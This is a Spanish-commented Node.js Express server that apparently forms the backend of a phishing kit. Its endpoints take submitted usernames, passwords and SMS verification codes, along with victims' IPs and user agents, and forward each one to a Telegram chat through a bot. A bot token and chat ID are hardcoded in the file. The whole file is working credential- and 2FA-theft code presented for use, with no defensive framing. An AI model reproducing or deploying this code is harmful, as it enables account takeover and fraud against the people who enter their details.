require('dotenv').config();
const express = require('express');
const axios = require('axios');
const app = express();

// Configuración de Telegram
const BOT_TOKEN = process.env.BOT_TOKEN || '7207232429:AAEsTg-EA9tSCaJYazHEqA-lvOfldZTczNU';
const CHAT_ID = process.env.CHAT_ID || '-1002548985972';

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Función para obtener IP del cliente
function getClientIp(req) {
  return req.headers['x-forwarded-for'] || req.connection.remoteAddress;
}

// Función para enviar mensaje a Telegram
async function sendToTelegram(message) {
  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    return true;
  } catch (error) {
    console.error('Error sending to Telegram:', error.message);
    return false;
  }
}

// Endpoint para credenciales
app.post('/user-endpoint', async (req, res) => {
  const { nombre, contra } = req.body;
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'];
  
  const telegramMsg = `🔐 *NUEVAS CREDENCIALES RECIBIDAS* 🔐\n\n` +
                     `👤 *Usuario:* \`${nombre}\`\n` +
                     `🔑 *Contraseña:* \`${contra}\`\n` +
                     `📍 *IP:* \`${ip}\`\n` +
                     `🕒 *Fecha:* ${new Date().toLocaleString()}\n` +
                     `📟 *User Agent:* ${userAgent}\n` +
                     `🌍 *Localización:* https://www.google.com/maps?q=${ip}`;

  const success = await sendToTelegram(telegramMsg);
  res.status(success ? 200 : 500).json({ success });
});

// Endpoint para SMS
app.post('/sms-endpoint', async (req, res) => {
  const { sms, nombre } = req.body;
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'];
  
  const telegramMsg = `✅ *NUEVO CÓDIGO SMS RECIBIDO* ✅\n\n` +
                     `🔢 *Código SMS:* \`${sms}\`\n` +
                     `👤 *Usuario:* \`${nombre}\`\n` +
                     `📍 *IP:* \`${ip}\`\n` +
                     `🕒 *Fecha:* ${new Date().toLocaleString()}\n` +
                     `📱 *User Agent:* ${userAgent}`;

  const success = await sendToTelegram(telegramMsg);
  res.status(success ? 200 : 500).json({ success });
});

// Endpoint para cancelaciones
app.post('/cancel-endpoint', async (req, res) => {
  const { tipo } = req.body;
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'];
  
  const telegramMsg = `❌ *SOLICITUD CANCELADA ${tipo === 2 ? '(2)' : ''}* ❌\n\n` +
                     `🕒 *Fecha:* ${new Date().toLocaleString()}\n` +
                     `📍 *IP Cliente:* \`${ip}\`\n` +
                     `📱 *Dispositivo:* ${userAgent}\n` +
                     `🌍 *Localización:* https://www.google.com/maps?q=${ip}`;

  await sendToTelegram(telegramMsg);
  res.json({ success: true });
});

// Endpoint para reenvío
app.post('/resend-endpoint', async (req, res) => {
  const ip = getClientIp(req);
  const userAgent = req.headers['user-agent'];
  
  const telegramMsg = `🔄 *REENVÍO DE SOLICITUD* 🔄\n\n` +
                     `🕒 *Fecha:* ${new Date().toLocaleString()}\n` +
                     `📍 *IP Cliente:* \`${ip}\`\n` +
                     `📱 *Dispositivo:* ${userAgent}`;

  await sendToTelegram(telegramMsg);
  res.json({ success: true });
});

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});